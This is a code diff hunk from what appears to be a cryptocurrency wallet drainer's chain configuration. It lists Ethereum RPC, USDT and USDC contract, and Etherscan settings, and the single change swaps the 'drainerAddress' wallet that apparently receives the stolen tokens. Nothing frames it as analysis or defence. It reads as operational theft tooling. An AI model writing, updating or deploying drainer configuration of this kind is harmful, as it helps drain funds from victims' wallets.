@@ -30,7 +30,7 @@ const CHAINS = {
     rpcUrls: ["https://rpc.ankr.com/eth"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    drainerAddress: "0x201c414dBCD40dD6fd0F494c2bb4DB0b7D8aE304",
+    drainerAddress: "0x7907CdDD42f823Ea59dc05fbcBA7e55398B91C2d",
     explorerApi: "https://api.etherscan.io/api",
     explorerApiKey: ETHERSCAN_API_KEY
   },
